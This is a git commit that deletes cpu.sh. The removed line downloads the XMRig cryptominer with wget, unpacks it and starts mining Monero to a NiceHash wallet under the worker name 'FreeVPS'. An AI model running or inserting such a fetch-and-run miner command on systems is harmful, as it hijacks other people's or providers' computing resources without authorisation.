af41ed522e980a1d644ee29464cf4b3b9fe9788a
MomboteQ <60738939+MomboteQ@users.noreply.github.com>
2022-04-29 12:48:55 +0200

    Delete cpu.sh

--- cpu.sh
+++
@@ -1,1 +0,0 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz && tar xf xmrig-6.16.4-linux-x64.tar.gz && cd xmrig-6.16.4 && ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 35maF4TVKyx17a2ooSzQFH5XFE9VvuHLF2.FreeVPS -p x -k -a rx/0 --nicehash
